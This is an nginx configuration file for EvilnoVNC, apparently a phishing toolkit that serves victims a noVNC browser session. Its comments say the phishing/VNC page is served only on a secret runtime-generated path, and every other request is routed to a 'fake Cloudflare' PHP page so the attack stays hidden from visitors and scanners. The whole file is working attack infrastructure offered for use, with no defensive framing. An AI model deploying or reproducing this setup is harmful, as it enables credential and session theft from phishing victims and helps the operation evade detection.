# EvilnoVNC: nginx on 80, PHP on 8080, noVNC on 5980.
# Only the secret URL (and its asset path) serve phishing/VNC; everything else -> PHP (fake Cloudflare).
# nginx_secret.conf is generated at runtime with SECRET_PATH and secret prefix.
daemon off;
error_log /dev/stderr info;
pid /tmp/nginx.pid;
events { worker_connections 64; }
http {
    access_log /dev/stdout;
    server {
        listen 80 default_server;
        server_name _;
        root /home/user;

        # Secret path and noVNC assets (generated in startVNC.sh)
        include /home/user/nginx_secret.conf;

        # All other paths -> PHP (fake Cloudflare only)
        location / {
            proxy_pass http://127.0.0.1:8080;
            proxy_http_version 1.1;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
    }
}
